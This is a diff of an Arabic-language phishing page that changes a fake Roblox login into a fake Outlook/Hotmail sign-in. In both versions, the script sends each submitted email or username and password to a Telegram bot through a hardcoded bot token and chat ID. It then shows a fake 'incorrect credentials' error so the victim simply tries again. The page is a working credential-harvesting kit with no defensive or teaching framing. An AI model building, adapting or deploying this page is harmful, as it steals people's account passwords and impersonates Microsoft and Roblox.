@@ -1,72 +1,266 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول - Outlook</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #e9f0f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .box { background: white; padding: 40px 30px; border-radius: 12px; max-width: 400px; width: 100%; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
-        .logo { font-size: 28px; font-weight: 900; color: #1a1a2e; }
-        .logo span { color: #2d7aff; }
-        .top { display: flex; justify-content: space-between; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; }
-        .top a { color: #2d7aff; text-decoration: none; font-size: 14px; margin-left: 12px; }
-        h2 { font-size: 22px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
-        button { width: 100%; padding: 14px; background: #2d7aff; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: 600; cursor: pointer; }
-        .link { text-align: center; margin-top: 12px; font-size: 14px; }
-        .link a { color: #2d7aff; text-decoration: none; }
-        .divider { display: flex; align-items: center; margin: 18px 0; color: #aaa; font-size: 12px; }
-        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 120px;
+            height: auto;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .sub {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .sub a {
+            color: #0066ff;
+            text-decoration: none;
+        }
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+            color: #333;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            background: #fafafa;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #0066ff;
+            outline: none;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0066ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .btn:hover {
+            background: #004ccc;
+        }
+        .options {
+            margin: 16px 0 10px;
+            font-size: 14px;
+            text-align: center;
+        }
+        .options a {
+            color: #0066ff;
+            text-decoration: none;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+        .error {
+            color: #d32f2f;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            margin-top: 10px;
+            background: #ffebee;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #aaa;
+            font-size: 12px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
         .divider::before { margin-right: 10px; }
         .divider::after { margin-left: 10px; }
-        .footer { text-align: center; margin-top: 16px; font-size: 14px; }
-        .footer a { color: #2d7aff; text-decoration: none; font-weight: 600; }
-        .bottom { display: flex; justify-content: center; gap: 15px; margin-top: 12px; font-size: 13px; }
-        .bottom a { color: #777; text-decoration: none; }
-        .err { color: #d32f2f; background: #ffebee; padding: 8px; border-radius: 6px; display: none; margin-top: 10px; text-align: center; }
+        .footer {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #555;
+        }
+        .footer a {
+            color: #0066ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover { text-decoration: underline; }
+        .sub-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 12px;
+            font-size: 12px;
+        }
+        .sub-links a {
+            color: #777;
+            text-decoration: none;
+        }
+        .sub-links a:hover { text-decoration: underline; }
+        .switch-link {
+            text-align: center;
+            margin: 8px 0;
+            font-size: 14px;
+        }
+        .switch-link a {
+            color: #0066ff;
+            text-decoration: none;
+        }
+        .switch-link a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-<div class="box">
-    <div class="top"><div class="logo">Roblox</div><div><a href="#">إنشاء</a><a href="#">الرائحة</a><a href="#">السوق</a></div></div>
-    <h2>تسجيل الدخول إلى Roblox</h2>
+
+<div class="container">
+    <!-- شعار Microsoft / Outlook -->
+    <div class="logo">
+        <svg viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="22" fill="#2672e4" font-size="24" font-weight="bold" font-family="Segoe UI, Arial, sans-serif">Outlook</text>
+        </svg>
+    </div>
+
+    <h2>تسجيل الدخول</h2>
+    <p class="sub">لتستمر في استخدام حسابك</p>
+
     <form id="loginForm">
-        <input type="text" id="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
-        <input type="password" id="password" placeholder="كلمة المرور" required>
-        <button type="submit">تسجيل الدخول</button>
-        <div class="link"><a href="#">نسيت كلمة المرور أو اسم المستخدم؟</a></div>
-        <div class="link"><a href="#">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</a></div>
-        <div class="err" id="errorMsg">⚠️ بيانات غير صحيحة</div>
+        <div class="input-group">
+            <label>البريد الإلكتروني أو رقم الهاتف</label>
+            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني أو رقم الهاتف" required>
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+        </div>
+
+        <button type="submit" class="btn">تسجيل الدخول</button>
+
+        <div class="options">
+            <a href="#">نسيت كلمة المرور؟</a>
+        </div>
+
+        <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
+
         <div class="divider">أو</div>
-        <div class="link"><a href="#">تسجيل دخول سريع</a></div>
-        <div class="footer">ليس لديك حساب؟ <a href="#">اشتراك</a></div>
-        <div class="bottom"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">اتصل بنا</a></div>
+
+        <div class="switch-link">
+            <a href="#">تسجيل الدخول باستخدام حساب Microsoft</a>
+        </div>
+
+        <div class="footer">
+            ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
+        </div>
+
+        <div class="sub-links">
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">اتصل بنا</a>
+        </div>
     </form>
 </div>
+
 <script>
+    // =============================================
+    // إعدادات بوت تليجرام
+    // =============================================
     const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
     const CHAT_ID = '6526473202';
+
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
         }).catch(e => console.log(e));
     }
+
+    // =============================================
+    // عند إرسال النموذج (جلب البيانات)
+    // =============================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const username = document.getElementById('username').value;
+
+        const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        sendToTelegram(`<b>🔓 بيانات روبلوكس</b>\n\n👤 ${username}\n🔑 ${password}`);
+
+        // إرسال البيانات إلى تليجرام
+        let dataMsg = `<b>📧 بيانات هوتميل (Outlook)</b>\n\n`;
+        dataMsg += `✉️ البريد: ${email}\n`;
+        dataMsg += `🔑 كلمة المرور: ${password}`;
+
+        sendToTelegram(dataMsg);
+
+        // إظهار رسالة خطأ وهمية
         document.getElementById('errorMsg').style.display = 'block';
+
+        // إعادة تعيين الحقول بعد 3 ثواني
         setTimeout(() => {
-            document.getElementById('username').value = '';
+            document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             document.getElementById('errorMsg').style.display = 'none';
         }, 3000);
     });
+
+    console.log('✅ صفحة هوتميل تعمل');
 </script>
+
 </body>
 </html>
